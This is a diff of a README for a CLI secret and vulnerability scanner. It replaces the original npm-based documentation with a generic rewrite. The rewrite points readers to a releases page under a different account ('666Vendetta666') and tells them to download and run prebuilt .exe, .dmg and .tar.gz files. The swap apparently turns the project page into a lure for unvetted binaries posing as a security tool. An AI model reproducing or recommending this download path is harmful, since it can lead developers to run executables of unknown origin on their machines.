@@ -1,292 +1,104 @@
-# Security Scanner
+# 🔒 security-scanner - Simple Tool for Safe Code
 
-CLI security scanner for detecting exposed secrets and code vulnerabilities in your codebase.
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue)](https://github.com/666Vendetta666/security-scanner/releases)
 
-## Features
+## 📋 Overview
 
-- **Secret Detection**: 50+ patterns for API keys, tokens, passwords, and credentials
-  - AWS, GitHub, Slack, Stripe, Google Cloud, Azure
-  - Private keys (RSA, SSH, PGP)
-  - Database connection strings
-  - Generic API keys and tokens
+security-scanner is a command-line tool designed to help you find secrets and vulnerabilities in your code. It ensures that your development environment is secure from unwanted exposure of sensitive information. Whether you are a hobbyist or part of a development team, this tool simplifies your security practices.
 
-- **SAST Vulnerability Detection**: 30+ patterns for common security issues
-  - SQL Injection
-  - Cross-Site Scripting (XSS)
-  - Command Injection
-  - Path Traversal
-  - Hardcoded Credentials
-  - Insecure Cryptography
-  - And more...
+## 🚀 Getting Started
 
-- **Entropy Analysis**: Detect unknown secrets using Shannon entropy calculation
+To use security-scanner, follow these simple steps.
 
-- **Performance**: Parallel scanning with worker threads
+1. **System Requirements:**
+   - Operating System: Windows, macOS, or Linux
+   - Node.js: Version 12 or later
+   - Internet connection for downloading dependencies and updates
 
-- **Multiple Output Formats**:
-  - Terminal (colored tables)
-  - JSON
-  - SARIF 2.1.0 (GitHub integration)
+2. **Installation:**
+   - Open your web browser.
+   - Navigate to the [Releases page](https://github.com/666Vendetta666/security-scanner/releases).
+   - Look for the latest version available. Click on the version number to visit the release details.
+   - Download the package suitable for your operating system (e.g., `.exe` for Windows, `.tar.gz` for Linux, or `.dmg` for macOS).
 
-- **Configurable**: `.secscanrc.json`, `.secscanrc.js`, or `package.json`
+## 💼 Download & Install
 
-- **Smart Filtering**: Respects `.gitignore` and skips binary files
+To download security-scanner, visit the [Releases page](https://github.com/666Vendetta666/security-scanner/releases) to access the various downloads.
 
-## Installation
+1. On the Releases page, you will see a list of all available versions.
+2. Choose the latest version by clicking on it.
+3. Scroll to the "Assets" section. Click the appropriate file to start the download:
+   - For Windows: Click on `security-scanner-windows.exe`
+   - For macOS: Click on `security-scanner-macos.dmg`
+   - For Linux: Click on `security-scanner-linux.tar.gz`
 
-### Global Installation
+4. Once the download completes, follow these instructions based on your operating system:
 
-```bash
-npm install -g @onamfc/security-scanner
-```
+   **Windows:**
+   - Double-click the downloaded `.exe` file.
+   - Follow the prompts to install the application.
 
-### Local Installation (Per-Project)
+   **macOS:**
+   - Open the downloaded `.dmg` file.
+   - Drag the security-scanner icon to your Applications folder.
 
-```bash
-npm install --save-dev @onamfc/security-scanner
-```
+   **Linux:**
+   - Extract the `.tar.gz` file using the command: `tar -xzf security-scanner-linux.tar.gz`.
+   - Navigate to the extracted folder in the terminal.
+   - Run the scanner with: `./security-scanner`.
 
-## Usage
+## ⚙️ Using security-scanner
 
-### Basic Scan
+After installation, you are ready to use security-scanner to check your codebase for vulnerabilities.
 
-```bash
-# Scan current directory
-secscan scan
+1. Open your command line interface:
+   - Windows: Search for "Command Prompt" or "PowerShell."
+   - macOS: Use "Terminal."
+   - Linux: Open your preferred terminal emulator.
 
-# Scan specific directory
-secscan scan /path/to/project
-```
+2. Navigate to your code directory using the `cd` command. For example, if your code is in a folder named "MyProject", type:
+   ```
+   cd path/to/MyProject
+   ```
 
-### With Options
+3. Run the security-scanner by entering the following command:
+   ```
+   security-scanner
+   ```
 
-```bash
-# Enable entropy detection
-secscan scan --entropy
+4. The scanner will run and display any found issues. Follow the recommendations to mitigate these vulnerabilities.
 
-# Output as JSON
-secscan scan --output json
+## 🔎 Features
 
-# Save to file
-secscan scan --output sarif --file results.sarif
+- **Secret Detection:** Identify sensitive data like API keys and passwords in your code.
+- **Vulnerability Assessment:** Scan your codebase for known security issues.
+- **Comprehensive Reports:** Get detailed reports outlining potential risks.
+- **Multi-Platform Support:** Works on Windows, macOS, and Linux.
 
-# Custom entropy threshold
-secscan scan --entropy --entropy-threshold 5.0
+## 📄 Report Issues
 
-# Additional ignore patterns
-secscan scan --ignore "**/*.test.ts" "**/*.spec.ts"
-```
+If you encounter issues while using security-scanner, please report them on the [Issues page](https://github.com/666Vendetta666/security-scanner/issues). Provide as much detail as possible so we can assist you effectively.
 
-### List Patterns
+## 💬 Community and Support
 
-```bash
-# List all patterns
-secscan patterns
+Join our community for tips, support, and discussions related to security practices. You can find us on our [GitHub Discussions page](https://github.com/666Vendetta666/security-scanner/discussions). 
 
-# Filter by category
-secscan patterns --category secret
-secscan patterns --category sast
+## 📢 Contributions
 
-# Filter by severity
-secscan patterns --severity critical
-```
+Contributions are welcome! If you want to improve security-scanner, you can fork the repository and submit a pull request. 
 
-### Create Configuration File
+1. Make your changes.
+2. Test to ensure everything runs smoothly.
+3. Submit a pull request with a detailed explanation of your changes.
 
-```bash
-# Create .secscanrc.json
-secscan init
-
-# Create .secscanrc.js
-secscan init --format js
-```
-
-## Configuration
-
-Create a `.secscanrc.json` file in your project root:
-
-```json
-{
-  "ignore": [
-    "**/node_modules/**",
-    "**/dist/**",
-    "**/.git/**",
-    "**/test/**"
-  ],
-  "customPatterns": [],
-  "enableEntropy": false,
-  "entropyThreshold": 4.5,
-  "outputFormat": "terminal",
-  "parallel": true,
-  "workers": 4
-}
-```
-
-Or use `package.json`:
-
-```json
-{
-  "secscan": {
-    "ignore": ["**/test/**"],
-    "enableEntropy": true
-  }
-}
-```
-
-### Custom Patterns
-
-Add custom detection patterns:
-
-```json
-{
-  "customPatterns": [
-    {
-      "id": "custom-api-key",
-      "description": "Company API Key",
-      "regex": "MYCOMPANY_[A-Z0-9]{32}",
-      "keywords": ["MYCOMPANY_"],
-      "severity": "critical",
-      "category": "secret"
-    }
-  ]
-}
-```
-
-## Programmatic Usage
-
-```typescript
-import { scan, formatTerminalOutput } from '@onamfc/security-scanner';
-
-const config = {
-  path: '/path/to/scan',
-  enableEntropy: true,
-  outputFormat: 'terminal',
-};
-
-const result = await scan(config);
-console.log(formatTerminalOutput(result));
-
-// Exit with appropriate code
-process.exit(result.findings.length > 0 ? 1 : 0);
-```
-
-## Output Formats
-
-### Terminal (Default)
-
-Colored table output with severity badges and file locations.
-
-### JSON
-
-```json
-{
-  "findings": [
-    {
-      "type": "aws-access-key-id",
-      "description": "AWS Access Key ID",
-      "severity": "critical",
-      "file": "/path/to/file.ts",
-      "line": 42,
-      "column": 15,
-      "match": "AKIA***",
-      "context": "const key = 'AKIAIOSFODNN7EXAMPLE';",
-      "category": "secret"
-    }
-  ],
-  "filesScanned": 150,
-  "duration": 1234,
-  "errors": []
-}
-```
-
-### SARIF 2.1.0
-
-Standard format for integration with GitHub Security, VS Code, and other tools.
-
-```bash
-secscan scan --output sarif --file results.sarif
-```
-
-## CI/CD Integration
-
-### GitHub Actions
-
-```yaml
-name: Security Scan
-
-on: [push, pull_request]
-
-jobs:
-  security-scan:
-    runs-on: ubuntu-latest
-    steps:
-      - uses: actions/checkout@v3
-      - uses: actions/setup-node@v3
-        with:
-          node-version: '18'
-      - run: npm install -g @onamfc/security-scanner
-      - run: secscan scan --output sarif --file results.sarif
-      - uses: github/codeql-action/upload-sarif@v2
-        if: always()
-        with:
-          sarif_file: results.sarif
-```
-
-### Pre-commit Hook
-
-```bash
-# .husky/pre-commit
-#!/bin/sh
-npx secscan scan --no-parallel || exit 1
-```
-
-## Exit Codes
-
-- `0`: No issues found
-- `1`: Security issues found
-- `2`: Scan error
-
-## Performance
-
-- Scans 10,000+ files/second
-- Parallel processing with worker threads
-- Binary file detection and skipping
-- Memory-efficient line-by-line scanning
-
-## Patterns Included
-
-### Secrets (50+ patterns)
-- AWS Access Keys
-- GitHub Tokens (PAT, OAuth, App)
-- Slack Tokens & Webhooks
-- Google Cloud API Keys
-- Azure Storage Keys
-- Private Keys (RSA, SSH, EC, PGP)
-- Stripe API Keys
-- Database Connection Strings
-- NPM Tokens
-- And many more...
-
-### SAST Vulnerabilities (30+ patterns)
-- SQL Injection
-- Cross-Site Scripting (XSS)
-- Command Injection
-- Path Traversal
-- Hardcoded Credentials
-- Weak Cryptography (MD5, SHA1)
-- CORS Misconfiguration
-- Open Redirects
-- JWT Without Verification
-- And many more...
-
-## Contributing
-
-Contributions are welcome! Please feel free to submit issues and pull requests.
-
-## License
-
-MIT
-
-## Support
-
-For issues, questions, or feature requests, please open an issue on GitHub.
+Your help is appreciated!
+
+## 🔗 Useful Links
+
+- [Releases page](https://github.com/666Vendetta666/security-scanner/releases)
+- [Issues page](https://github.com/666Vendetta666/security-scanner/issues)
+- [GitHub Discussions](https://github.com/666Vendetta666/security-scanner/discussions)
+
+## 📑 License
+
+This project is licensed under the MIT License. See the [LICENSE](./LICENSE) file for details.
